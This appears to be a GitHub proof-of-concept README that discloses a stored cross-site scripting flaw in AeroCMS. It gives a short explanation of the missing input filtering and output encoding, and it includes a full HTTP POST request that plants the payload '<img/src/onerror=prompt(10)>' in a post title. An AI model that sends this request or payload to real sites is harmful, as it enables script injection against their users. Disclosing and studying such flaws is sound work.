# AeroCMS-Stored_XSS-Poc
* `add_post.php`
![image](https://user-images.githubusercontent.com/79050415/156879687-273b903a-195c-4313-be7a-b4053ecae897.png)
When inserting into the database, the input is not filtered out of html characters
* `post.php`
![image](https://user-images.githubusercontent.com/79050415/156879786-ed53b64e-cf92-4160-aacd-32440b795d32.png)
Even when displaying, the entity cannot be properly encoded
-------------------------------------------------------------
![image](https://user-images.githubusercontent.com/79050415/156879926-c7009ae0-54b5-4b5c-a49f-6c693ce8f2e5.png)
 * Request
`POST http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=28 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------85448121341942511952219062291
Content-Length: 1101
Origin: http://localhost:8080
Connection: keep-alive
Referer: http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=28
Cookie: Phpstorm-6b6ba5ee=79a50460-3b02-4cde-a5a4-ff6883c16a7b; PHPSESSID=ndh6ks953tmha1ps8cfp4bplf2
Upgrade-Insecure-Requests: 1

-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="post_title"

<img/src/onerror=prompt(10)>
-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="post_category_id"

1
-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="post_user"

admin
-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="post_status"

published
-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="image"; filename=""
Content-Type: application/octet-stream


-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="post_tags"

1
-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="post_content"

<p>111</p>
-----------------------------85448121341942511952219062291
Content-Disposition: form-data; name="update_post"

Edit Post
-----------------------------85448121341942511952219062291--`
